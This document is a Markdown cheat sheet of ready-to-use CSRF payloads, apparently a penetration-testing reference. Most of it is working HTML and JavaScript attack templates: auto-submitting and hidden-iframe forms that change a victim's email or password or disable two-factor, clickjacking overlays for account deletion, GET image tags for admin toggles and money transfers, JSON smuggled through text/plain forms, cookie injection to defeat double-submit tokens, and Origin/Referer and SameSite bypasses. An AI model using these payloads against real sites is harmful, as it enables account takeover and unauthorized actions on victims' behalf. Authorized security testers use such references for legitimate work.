# CSRF Payloads

This document provides ready-to-use CSRF payloads and templates for common patterns, plus variations to bypass weak defenses. Adjust parameter names and endpoints to the target application.

## Table of Contents
- [HTML Form PoCs](#html-form-pocs)
- [Auto-submit Variants](#auto-submit-variants)
- [GET-based CSRF](#get-based-csrf)
- [JSON/Fetch CSRF](#jsonfetch-csrf)
- [Header/Origin Bypass Techniques](#headerorigin-bypass-techniques)
- [Double Submit Cookie Scenarios](#double-submit-cookie-scenarios)
- [SameSite Bypass Scenarios](#samesite-bypass-scenarios)
- [Content-Type Manipulation](#content-type-manipulation)
- [Framework-specific Notes](#framework-specific-notes)
- [Payload Checklist](#payload-checklist)

## HTML Form PoCs

Basic POST PoC for form-encoded endpoints:
```html
<form action="https://target.com/profile/update" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf_token" value="TOKEN_IF_REQUIRED">
  <input type="submit" value="Submit">
</form>
```

With auto-submit (JavaScript):
```html
<form id="csrf" action="https://target.com/user/password" method="POST">
  <input type="hidden" name="new_password" value="Passw0rd!23">
  <input type="hidden" name="confirm_password" value="Passw0rd!23">
</form>
<script>document.getElementById('csrf').submit();</script>
```

With hidden iframe (to avoid navigation):
```html
<iframe name="stealth" style="display:none"></iframe>
<form target="stealth" action="https://target.com/api/settings" method="POST">
  <input type="hidden" name="two_factor" value="off">
</form>
<script>document.forms[0].submit();</script>
```

## Auto-submit Variants

Delayed auto-submit to bypass lazy loads:
```html
<script>
setTimeout(()=>document.forms[0].submit(), 150);
</script>
```

Clickjacking-assisted CSRF (when user interaction is required):
```html
<style>
#btn{position:absolute;opacity:.01;left:20px;top:30px;}
iframe{position:absolute;left:0;top:0;width:400px;height:200px;opacity:.01;}
</style>
<iframe src="https://target.com/account/delete"></iframe>
<button id="btn" onclick="document.forms[0].submit()">Play</button>
```

## GET-based CSRF

When state changes are (incorrectly) handled via GET:
```html
<img src="https://target.com/admin/toggle?user=123&admin=true">
```

With referer spoof via URL shortener redirection (requires weak checks):
```html
<img src="https://short.evil/redirect?to=https%3A%2F%2Ftarget.com%2Ftransfer%3Famount%3D1000%26to%3D987" />
```

## JSON/Fetch CSRF

Some servers accept JSON without strict CORS or with SameSite=None cookies.

Using form to send JSON (Content-Type confusion on server):
```html
<form action="https://target.com/api/profile" method="POST" enctype="text/plain">
{"email":"evil@evil.com","csrf":"ignored"}
</form>
<script>document.forms[0].submit()</script>
```

Using multipart/form-data (some frameworks parse into JSON structures):
```html
<form action="https://target.com/api/profile" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="{\"email\":\"evil@evil.com\"}" value="">
</form>
<script>document.forms[0].submit()</script>
```

## Header/Origin Bypass Techniques

When server only checks Origin/Referer loosely:

Match-and-replace Origin to subdomain (used during testing):
```text
Origin: https://evil.target.com
Referer: https://evil.target.com/poc
```

Using open redirect on target to satisfy Referer checks:
```html
<img src="https://target.com/redirect?next=/transfer?to=987&amount=1000">
```

## Double Submit Cookie Scenarios

If app compares cookie csrf_token with form csrf_token:
```html
<script>
document.cookie = 'csrf_token=attack123; domain=.target.com; path=/';
</script>
<form action="https://app.target.com/profile" method="POST">
  <input type="hidden" name="csrf_token" value="attack123">
  <input type="hidden" name="email" value="evil@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

## SameSite Bypass Scenarios

- Cookies with SameSite=None but without Secure are rejected by modern browsers; however, misconfigs may set Lax allowing top-level GET CSRF.
- Exploit top-level navigation with GET endpoints:
```html
<a href="https://target.com/email/confirm?email=evil@evil.com">Click me</a>
```
- Use cross-site POST with user interaction (if browser blocks automatic cookies):
```html
<form action="https://target.com/phone/update" method="POST">
  <input type="hidden" name="phone" value="+15551234567">
  <input type="submit" value="Update">
</form>
```

## Content-Type Manipulation

Try alternative content types that some backends accept:
- text/plain
- application/x-www-form-urlencoded
- multipart/form-data

Example forcing text/plain:
```html
<form action="https://target.com/api/change" method="POST" enctype="text/plain">
param1=value1&param2=value2
</form>
<script>document.forms[0].submit()</script>
```

## Framework-specific Notes

- Django: Ensure CSRF cookie + header validation; legacy endpoints may accept GET.
- Spring Security: Look for endpoints excluded from CsrfFilter (e.g., /api/*).
- Express/Node: csrf() middleware must be applied to all state-changing routes.
- Rails: protect_from_forgery must be enabled; JSON endpoints can be missed.

## Payload Checklist

- [ ] Form-based POST PoC
- [ ] Auto-submit with and without iframe
- [ ] GET-based image/link PoC
- [ ] JSON via text/plain PoC
- [ ] Multipart name trick PoC
- [ ] Origin/Referer spoof strategy
- [ ] Double-submit cookie alignment
- [ ] SameSite navigation scenario
- [ ] Content-Type variations
- [ ] Notes for detected framework

## References
- PortSwigger: https://portswigger.net/web-security/csrf
- OWASP Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- MDN SameSite cookies: https://developer.mozilla.org/docs/Web/HTTP/Headers/Set-Cookie/SameSite
